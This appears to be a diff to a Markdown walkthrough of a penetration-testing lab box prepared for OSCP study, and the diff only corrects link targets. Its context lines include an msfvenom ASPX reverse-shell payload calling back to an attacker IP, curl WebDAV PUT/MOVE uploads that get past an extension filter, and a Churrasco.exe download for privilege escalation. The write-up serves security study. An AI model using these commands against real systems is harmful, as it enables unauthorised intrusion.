@@ -5,7 +5,7 @@
 - Prep: [OSCP](OSCP.md)
 [Done](Done)
 - **Exploits Used**:
-  - [HTTP](HTTP) WebDAV PUT/MOVE
+  - [HTTP](HTTP.md) WebDAV PUT/MOVE
   - File extension bypass via `.txt → .aspx`
   - Local PrivEsc using `Churrasco.exe`
 
@@ -17,7 +17,7 @@
 ```bash
 nmap -p- -T5 10.10.10.15
 ```
-Only **port 80 ([HTTP](HTTP))** is open.
+Only **port 80 ([HTTP](HTTP.md))** is open.
 
 ### 📌 Service Enumeration
 ```bash
@@ -53,12 +53,12 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f aspx -o sh
 mv shell.aspx shell.txt
 ```
 
-### 2️⃣ Upload Using [HTTP](HTTP) `PUT`
+### 2️⃣ Upload Using [HTTP](HTTP.md) `PUT`
 ```bash
 curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.txt
 ```
 
-### 3️⃣ Rename Using [HTTP](HTTP) `MOVE`
+### 3️⃣ Rename Using [HTTP](HTTP.md) `MOVE`
 ```bash
 curl -X MOVE --header 'Destination:http://10.10.10.15/shell.aspx' http://10.10.10.15/shell.txt
 ```
@@ -99,7 +99,7 @@ wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
 mv churrasco.exe churrasco.txt
 ```
 
-### 3️⃣ Upload via [HTTP](HTTP)
+### 3️⃣ Upload via [HTTP](HTTP.md)
 ```bash
 curl -X PUT http://10.10.10.15/churrasco.txt --data-binary @churrasco.txt
 ```
@@ -151,7 +151,7 @@ type C:\Documents and Settings\Administrator\Desktop\root.txt
 
 | Phase              | Method                                         |
 |-------------------|------------------------------------------------|
-| Recon              | Found IIS 6.0 with [HTTP](HTTP) WebDAV        |
+| Recon              | Found IIS 6.0 with [HTTP](HTTP.md) WebDAV        |
 | Initial Access     | Used PUT/MOVE to bypass extension restriction |
 | Privilege Escalation | Token impersonation using `Churrasco.exe` |
 | Final Access       | SYSTEM shell via netcat                       |
